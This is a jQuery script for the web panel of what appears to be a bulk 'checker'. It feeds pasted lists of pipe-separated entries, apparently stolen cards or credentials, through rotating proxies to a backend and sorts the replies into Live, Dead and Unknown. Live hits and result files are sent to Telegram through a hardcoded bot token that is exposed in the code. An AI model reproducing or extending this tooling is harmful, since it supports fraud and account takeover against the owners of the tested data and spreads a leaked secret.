$(document).ready(function() {
    //Swal.fire({ title: "Warning!", text: "VIRUS DETECTED!", icon: "warning", confirmButtonText: "OK", buttonsStyling: false, confirmButtonClass: 'btn btn-primary'});
    ////////////// bot value //////////
    $('#bot').val($('#idchat').val());
    $('#idchat').on('change', function() {
        $('#bot').val(this.value);
    });

    $('#Bot').val($('#IdChat').val());
    $('#IdChat').on('change', function() {
        $('#Bot').val(this.value);
    });
    ////////////end change bot ///////////	

    //////////// enter tg////////////
    $('#text').on("keyup", function(e) {
        if (e.keyCode == 13) {
            if ($('#text').val() === '') {
                alert('Message cannot be empty');
            } else {
                send_tg_mess();
            }
        }
    });

    /////////end enter//////////
    $('#btn-descargar').on('click', function() {
        const nombreArchivo = prompt('Introduce el nombre del archivo a descargar:');
        if (nombreArchivo) {
            const texto = $('#lives')[0].innerText;
            const blob = new Blob([texto], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = $('<a>').attr({
                href: url,
                download: `${nombreArchivo}.txt`
            });
            a[0].click();
            URL.revokeObjectURL(url);
        }
    });

    $("#iniciar").click(function() {
        if (this.value === 'Download') {
            this.value = 'Stop';
            $('#result').fadeIn(2000);
            $('#dea').hide(800);
            $('#unkk').hide(800);
            auto_reset();

            executar = true;
            iniciar();
            $("#lista").scrollTop(0);
        } else if (this.value === 'Stop') {
            document.getElementById('lista').disabled = false;
            document.getElementById('antiduplicate').disabled = false;
            $("#status").html('Checker Stopped <i class="fa fa-stop" aria-hidden="true"></i>');
            this.value = 'Download';
            executar = false;
        }
    });
    $('#lab_die').click(function() {
        $('#dea').toggle(800);
        $('#liv').hide(800);
        $('#unkk').hide(800);
    });
    $('#lab_liv').click(function() {
        $('#liv').toggle(800);
        $('#dea').hide(800);
        $('#unkk').hide(800);
    });
    $('#lab_unk').click(function() {
        $('#unkk').toggle(800);
        $('#liv').hide(800);
        $('#dea').hide(800);
    });
});

var executar = true;
var batchSize = 1; // Variable global para controlar el tamaño del batch

function control_check() {
    if (document.getElementById("controlck").checked) {
        var userInput = prompt("Enter number of tickets per batch (default: 1)", "1");
        if (userInput !== null) {
            batchSize = parseInt(userInput) || 1;
            if (batchSize < 1) batchSize = 1;
            Swal.fire({
                title: 'Batch size set to ' + batchSize,
                icon: 'success',
                showConfirmButton: false,
                toast: true,
                position: 'top-end',
                timer: 2000
            });
        } else {
            document.getElementById("controlck").checked = false;
        }
    } else {
        batchSize = 1; // Volver al valor por defecto cuando se desactiva
    }
}

function titulo(novo) {
    document.title = novo;
}

function contar_total(lista) {
    'use strict';
    var array = lista.value.split("\n");
    var total = array.length;

    if (array.length === undefined) {
        total = 0;
    }
    $("#tudo_conta").text(total);
}

function remover_linha(id) {
    var lines = $(id).val().split('\n');
    lines.splice(0, 1);
    $(id).val(lines.join("\n"));
}

var valorArray0 = '';

function start() {
    if (!executar) {
        return false;
    }
    
    var array = lista.value.split("\n");
    var ticketsABuscar = array.slice(0, batchSize);
    
    if (ticketsABuscar.length > 0 && ticketsABuscar[0] !== "") {
        var requestsCompleted = 0;
        var totalRequests = ticketsABuscar.length;
        
        ticketsABuscar.forEach(function(ticket) {
            valorArray0 = ticket;
            var currentProxy = getNextProxy(); // Obtiene y rota el proxy
            
            startchk(ticket, currentProxy, function() {
                requestsCompleted++;
                
                if (requestsCompleted >= totalRequests) {
                    array.splice(0, totalRequests);
                    $("#lista").val(array.join("\n"));
                    
                    if (array.length > 0 && array[0] !== "") {
                        start();
                    } else {
                        finalizarChequeo();
                    }
                }
            });
        });
    } else {
        finalizarChequeo();
    }
    return;
}

function getNextProxy() {
    var proxys = $("#proxy").val().split('\n').filter(p => p.trim() !== '');
    if (proxys.length === 0) return "";
    
    var currentProxy = proxys[0];
    // Rotar el proxy (mover el primero al final)
    proxys.push(proxys.shift());
    $("#proxy").val(proxys.join("\n"));
    
    return currentProxy;
}

function finalizarChequeo() {
    $("#iniciar").val('Download');
    notificar("Checking done!");
    document.getElementById('antiduplicate').disabled = false;
    document.getElementById('lista').disabled = false;
    document.getElementById("lista").value = "";
    playend(valorArray0);
    status('Checker Success! <img src="images/chk_good.png" />');
}

function play() {
    audio = document.getElementById('audio');
    audio.load();
    audio.play();
}

function playend(msit) {
    end = document.getElementById('end');
    end.load();
    end.play();
    if (document.getElementById("autofile").checked === true) {
        var namef = msit.split("|");
        console.log(namef[0]);
        stfila(namef[0])
    }
}

function playunk() {
    end = document.getElementById('unk');
    end.load();
    end.play();
}

function reseta() {
    $("#live_conta").text("0");
    $("#dead_conta").text("0");
    $("#unknow_conta").text("0");
    $("#testado").text("0");
    $("#tudo_conta").text("0");
    $("#live_conta_1").text("0");
    $("#dead_conta_2").text("0");
    $("#unknow_conta_3").text("0");
}

function unique(array) {
    return array.filter(function(el, index, arr) {
        return index == arr.indexOf(el);
    });
}

function remover_proxy_vazias() {
    var array = $("#proxy").val().split('\n');
    array = [...new Set(array)];
    array = array.filter(linea => linea.trim() !== '');
    $("#proxy").val(array.join("\n"));
}

function status(text, type) {
    if (!type) {
        type = "primary";
    }
    $("#status").removeClass().addClass("label label-" + type).html(text);
}

function iniciar() {
    remover_proxy_vazias();
    document.getElementById('lista').disabled = true;
    document.getElementById('antiduplicate').disabled = true;
    reseta();
    var lista = document.getElementById("lista").value;
    if (lista.length == "0") {
        $("#iniciar").val('Download');
        document.getElementById('lista').disabled = false;
        document.getElementById('antiduplicate').disabled = false;
        $('#result').fadeOut(1000);
        status('Invalid List! <img src="images/error.png" />');
        return;
    }
    $("#dlhere").show(500);
    $('#liv').show(800);
    anti_duplicate();
    contar_total(document.getElementById("lista"));
    start();
}

function notificar(msg, icone) {
    if (Notification.permission === "granted") {
        var options = {
            body: msg,
            icon: "files/notificacao.jpg",
            dir: "ltr"
        };
        var notification = new Notification("Informacion", options);
    } else if (Notification.permission !== 'denied') {
        Notification.requestPermission(function(permission) {
            if (!('permission' in Notification)) {
                Notification.permission = permission;
            }

            if (permission === "granted") {
                var options = {
                    body: msg,
                    icon: "files/notificacao.jpg",
                    dir: "ltr"
                };
                var notification = new Notification("Informacion", options);
            }
        })
    }
}
var antes;

function convert_sec(ms) {
    var seconds, x;
    x = ms / 1000;
    seconds = x % 60;
    if (seconds > 1) {
        seconds = seconds.toString().substring(0, 4);
        return seconds + " s";
    }
    return ms + "ms";
}

function rnd(x, a) {
    return Math.floor(Math.random() * (a + 1 - x)) + x
}

function startchk(url, currentProxy, callback) {
    status('Checker Running <i class="fa fa-spinner fa-pulse" aria-hidden="true"></i>');
    var proxyParam = currentProxy ? '&proxy=' + encodeURIComponent(currentProxy) : '';
    
    $.ajax({
        type: "POST",
        url: "index.php?rand=" + Math.random(),
        data: "urllist=" + encodeURIComponent(url) + proxyParam,
        beforeSend: function() {
            antes = Date.now();
        },
        success: function(data) {
            if (/type=\"password\" name=\"secure\"/.test(data) == true) {
                alert('Expired Cookies ! Please login again.');
                location.href = './login.php?go=logout';
                return;
            }
            if (/errorlogin/.test(data) == true) {
                alert('You are not a mod! Please login again.');
                location.href = './login.php?go=logout';
                return;
            }

            var countlive = (eval(document.getElementById("live_conta").innerHTML) + 1);
            var countlixo = (eval(document.getElementById("dead_conta").innerHTML) + 1);
            var countunk = (eval(document.getElementById("unknow_conta").innerHTML) + 1);

            var time_req = Date.now() - antes;
            var array = lista.value.split("\n");
            var words = array[0].split('|');

            time_req = convert_sec(time_req);
            if (data.includes("Dead")) {
                remover_linha("#lista");
                $("#deads").append(data);
                $("#dead_conta").text(countlixo);
                $("#dead_conta_2").text(countlixo);
            } else if (data.includes("Live")) {
                Swal.fire({
                    title: countlive + ' LIVE found! 🔥',
                    icon: 'success',
                    showConfirmButton: false,
                    toast: true,
                    position: 'top-end',
                    timer: 3000
                });
                play();
                send_tg('[' + words[0] + ']' + data);
                remover_linha("#lista");
                $("#lives").append(data);
                $("#live_conta").text(countlive);
                $("#live_conta_1").text(countlive);
            } else {
                $("#iniciar").val() === 'Stop' ? $("#iniciar").click() : null;
                playunk();
                remover_linha("#lista");
                $("#unknow").append(url + '<span class="report">==► ' + data + '</span><br>');
                $("#unknow_conta").text(countunk);
                $("#unknow_conta_3").text(countunk);
                $('#liv').hide(800);
                $('#dea').hide(800);
                $('#unkk').show(800);
                $("#status").focus();	
                $.ajaxStop();						
            }
            $("#testado").text(((countlive + countlixo) + countunk) - 2);

            if (callback) callback();
        },
        error: function() {
            if (callback) callback();
        }
    });
}

function reseturl() {
    $("#lives").html("");
    $("#deads").html("");
    $("#unknow").html("");
    $('#dea').hide(800);
    $('#liv').hide(800);
    $('#unkk').hide(800);
    $("#live_conta").text(0);
    $("#live_conta_1").text(0);
    $("#dead_conta").text(0);
    $("#dead_conta_2").text(0);
    $("#unknow_conta").text(0);
    $("#unknow_conta_3").text(0);
    $("#testado").text(0);
    $("#tudo_conta").text(0);
    $('#lista').val("");
    $("#dlhere").hide(800);
    status('Checker Waiting! ', '');
}

function anti_duplicate() {
    if (document.getElementById("antiduplicate").checked === true) {
        var array = $("#lista").val().split('\n');
        array = [...new Set(array)];
        array = array.filter(linea => linea.trim() !== '');
        $("#lista").val(array.join("\n"));
    } else {
        var array = $("#lista").val().split('\n');
        for (i = 0; i < array.length; i++) {
            if (array[i].trim().length === 0) {
                array.splice(i, 1);
            }
        }
        $("#lista").val(array.join("\n"));
    }
}

function auto_reset() {
    if (document.getElementById("autoreset").checked === true) {
        $("#lives").html("");
        $("#deads").html("");
        $("#unknow").html("");
        $('#dea').hide(800);
        $('#liv').hide(800);
        $('#unkk').hide(800);
        $("#live_conta").text(0);
        $("#live_conta_1").text(0);
        $("#dead_conta").text(0);
        $("#dead_conta_2").text(0);
        $("#unknow_conta").text(0);
        $("#unknow_conta_3").text(0);
        $("#testado").text(0);
        $("#tudo_conta").text(0);
        $("#dlhere").hide(800);
    } else {
        $('#dlhere').show(800);
        $('#liv').show(800);
    }
}

function auto_post() {
    if (document.getElementById("autopost").checked === true) {
        Swal.fire({title: 'Enviar al encontrar Activado!', icon: 'success', showConfirmButton: false, toast: true, position: 'top-center', timer: 2000});
        $('#autop').show(800);
    } else {
        $('#autop').hide(800);
    }
}

function auto_file() {
    if (document.getElementById("autofile").checked === true) {
        Swal.fire({title: 'Enviar al terminar Activado!', icon: 'success', showConfirmButton: false, toast: true, position: 'top-center', timer: 2000});
        $('#autofil').show(800);
    } else {
        $('#autofil').hide(800);
    }
}

function send_tg(lv) {
    if (document.getElementById("autopost").checked === true) {
        let mes = lv;
        mes = mes.replace(/(<([^>]+)>)/ig, '');

        $.ajax({
            type: "POST",
            url: "?rand=" + Math.random(),
            data: "tgid=" + $('#bot').val() + '&text=' + mes
        });
    }
}

function send_tg_mess() {
    let mas = $('#text').val();
    send_tg(mas);
    $('#text').val("");
}

function stfil() {
    const nombreArchivo = prompt('Nombre del Archivo a enviar:');
    if (nombreArchivo) {
        let mes = $('#lives')[0].innerText;
        mes = mes.replace(/(<([^>]+)>)/ig, '');
        var chatId=$('#Bot').val()
        var archivoTemporal = new Blob([mes], { type: 'text/plain' });
        var formData = new FormData();
        formData.append('document', archivoTemporal, nombreArchivo + '.txt');
        fetch('https://api.telegram.org/bot5901274026:AAEneQJ9yUo0CbIc1m80RP_Rw7Fka24bGmo/sendDocument?chat_id=' + chatId, {
            method: 'POST', 
            body: formData
        })
        .then(response => {
            console.log('Documento enviado con éxito');
        })
        .catch(error => {
            console.log('Error al enviar el documento: ' + error);
        });
    }
}

function stfila(fnames) {
    if (fnames) {
        var fechaActualMX = new Date().toLocaleString("es-MX", { timeZone: "America/Mexico_City" });
        var fechaSeparada = fechaActualMX.replace(", ", "_").replace(/\//g, "-").replace(" ", "-");
        
        let mes = $('#lives')[0].innerText;
        mes = mes.replace(/(<([^>]+)>)/ig, '');
        var chatId=$('#Bot').val()
        var archivoTemporal = new Blob([mes], { type: 'text/plain' });
        var formData = new FormData();
        formData.append('document', archivoTemporal, fnames +'_'+ fechaSeparada+ '.txt');
        fetch('https://api.telegram.org/bot5901274026:AAEneQJ9yUo0CbIc1m80RP_Rw7Fka24bGmo/sendDocument?chat_id=' + chatId, {
            method: 'POST', 
            body: formData
        })
        .then(data => console.log(data))
        .then(response => {
            console.log('Documento enviado con éxito');
        })
        .catch(error => {
            console.log('Error al enviar el documento: ' + error);
        });
    }
}

function rotateprox() {
    var array = $("#proxy").val().split('\n');
    array.push(array[0]);
    array.splice(0, 1);
    $('#proxy').val(array.join("\n"));
}

function ran_emo() {
    const emoticones = [
        "😀", "😁", "😂", "🤣", "😃", "😄", "😅", "😆", "😉", "😊",
        "😋", "😎", "😍", "😘", "😗", "😙", "😚", "☺️", "🙂", "🤗",
        "🤔", "😐", "😑", "😶", "🙄", "😏", "😣", "😥", "😮", "🤐",
        "😯", "😪", "😫", "😴", "😌", "😛", "😜", "😝", "🤤", "😒",
        "😓", "😔", "😕", "🙃", "🧨", "😲", "☹️", "🙁", "😖", "😞",
        "😟", "😤", "😢", "😭", "😦", "😧", "😨", "😩", "🤯", "😱",
        "🥵", "🥶", "🥴", "😵", "💰", "🇲🇽", "🤧", "😷", "🤒", "🤕",
        "🤑", "🤠", "🤡", "🤖", "👽", "👾", "👹", "👺", "💀", "👻",
        "💩", "😺", "😸", "😹", "😻", "😼", "😽", "🙀", "😿", "😾"
    ]
    const random = Math.floor(Math.random() * emoticones.length);
    return emoticones[random];
}